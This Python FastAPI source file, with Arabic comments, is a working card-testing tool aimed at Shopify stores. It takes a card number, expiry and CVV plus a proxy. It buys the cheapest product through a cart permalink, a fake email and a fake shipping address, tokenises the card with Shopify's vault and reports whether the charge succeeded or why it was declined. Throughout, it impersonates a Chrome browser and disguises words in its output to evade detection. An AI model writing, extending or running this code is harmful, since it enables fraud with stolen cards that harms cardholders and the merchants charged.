from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import random

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    """تشفير الكلمات الممنوعة لكي لا يحذف البوت البروكسي، وإرسال السعر الصافي بدون $"""
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx")
    clean_msg = clean_msg.replace("Connection", "Conn").replace("connection", "conn")
    clean_msg = clean_msg.replace("Timeout", "T-out").replace("timeout", "t-out")
    
    # تنظيف السعر من أي علامات $ لتجنب التكرار في البوت
    clean_price = str(price).replace('$', '').strip()
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

def extract_token_brute_force(html_text):
    """رادار كاسح يستخرج التوكن من النظام القديم والجديد (React/Extensibility)"""
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'authenticity_token\\u0022:\\u0022([^\\]+)\\u0022',
        r'\\u0026authenticity_token=([^&"\'\\]+)',
        r'checkout_token"\s*:\s*"([^"]+)"'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: 
            return match.group(1)
    return None

def extract_gateway(html_text):
    patterns = [
        r'name="checkout\[payment_gateway\]"\s*type="radio"\s*value="(\d+)"',
        r'value="(\d+)"\s*name="checkout\[payment_gateway\]"',
        r'"payment_instruments"\s*:\s*\[\{"id"\s*:\s*(\d+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: return match.group(1)
    return "1"

async def get_cheapest_product(session, store_url):
    try:
        headers = {"Accept": "application/json"}
        res = await session.get(f"{store_url}/products.json?limit=250", headers=headers)
        if res.status_code != 200: return None, "-"
        
        data = res.json()
        cheapest_variant = None
        lowest_price = float('inf')
        
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                if variant.get('available', True): 
                    try:
                        price_val = float(variant.get('price', 0.0))
                        if price_val > 0.0:
                            # حل مشكلة السعر الفلكي (السنتات)
                            if price_val > 10000: 
                                price_val = price_val / 100.0
                                
                            if price_val < lowest_price:
                                lowest_price = price_val
                                cheapest_variant = variant.get('id')
                    except: pass
        
        if cheapest_variant:
            return cheapest_variant, str(round(lowest_price, 2))
        return None, "-"
    except:
        return None, "-"

async def check_shopify(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify API")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # متصفح شبحي
        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=50) as session:
            
            # 1. جلب المنتج وتصحيح السعر
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id:
                return safe_response("No active products found (Store Empty)", "-", "Shopify API")

            # 2. الهجوم بالـ Permalink (تخطي السلة وإدخال الإيميل مباشرة في الرابط)
            email = f"johndoe{random.randint(1000,9999)}@gmail.com"
            checkout_url = f"{store_url}/cart/{variant_id}:1?checkout[email]={email}"
            
            res_checkout = await session.get(checkout_url, allow_redirects=True)
            html_checkout = res_checkout.text
            final_url = str(res_checkout.url)

            # كشف البوابات الخارجية (ShopPay / Paypal)
            if "shop.app" in final_url or "paypal.com" in final_url:
                return safe_response("External Checkout (ShopPay/PayPal) - Unsupported", price, "Shopify API")

            # 3. سحب التوكن العنيف
            auth_token = extract_token_brute_force(html_checkout)

            if not auth_token:
                title_match = re.search(r'<title>([^<]+)</title>', html_checkout)
                page_title = title_match.group(1).strip() if title_match else "Unknown"
                if "Just a moment" in page_title or "Cloudflare" in page_title:
                    return safe_response("Cloudflare Blocked IP", price, "Shopify API")
                return safe_response("Token Not Found (Hard Extensibility)", price, "Shopify API")

            # 4. تخطي الشحن (إرسال بيانات وهمية)
            address_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "contact_information",
                "step": "payment_method",
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Doe",
                "checkout[shipping_address][address1]": "123 Main Street",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][phone]": "(212) 555-1234",
                "button": ""
            }
            res_addr = await session.post(final_url, data=address_payload, allow_redirects=True)
            html_addr = res_addr.text
            final_url = str(res_addr.url)

            auth_token_final = extract_token_brute_force(html_addr) or auth_token
            gateway_id = extract_gateway(html_addr)

            # 5. تشفير البطاقة
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {"Accept": "application/json", "Content-Type": "application/json"}
            
            res_token = await session.post(token_url, json=token_payload, headers=token_headers)
            if res_token.status_code != 200: 
                return safe_response("IP Banned by Shopify Payment Server", price, "Shopify API")
            
            payment_token = res_token.json().get("id")

            # 6. الهجوم النهائي
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token_final,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": gateway_id, 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res_pay = await session.post(final_url, data=payment_payload, allow_redirects=True)
            result_html = res_pay.text.lower()
            
            # 7. قراءة الرد الدقيق
            if "thank you" in result_html or "order completed" in result_html or res_pay.url.endswith('/thank_you'):
                return safe_response("Order completed 💎", price, "Shopify API")
            elif "insufficient funds" in result_html or "not enough funds" in result_html: 
                return safe_response("Insufficient Funds", price, "Shopify API")
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: 
                return safe_response("Incorrect CVC", price, "Shopify API")
            elif "zip code does not match" in result_html or "avs" in result_html: 
                return safe_response("ZIP Code Mismatch", price, "Shopify API")
            elif "do not honor" in result_html or "generic_decline" in result_html: 
                return safe_response("Do Not Honor", price, "Shopify API")
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                if error_match: return safe_response(error_match.group(1).strip(), price, "Shopify API")
                
                if "payment" in result_html and "error" in result_html:
                     return safe_response("Generic Payment Error", price, "Shopify API")
                     
                return safe_response("Declined / Blocked by Gate", price, "Shopify API")

    except Exception as e:
        err_str = str(e).lower()
        return safe_response(f"Sys_Err: {err_str[:40]}", "-", "Shopify API")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
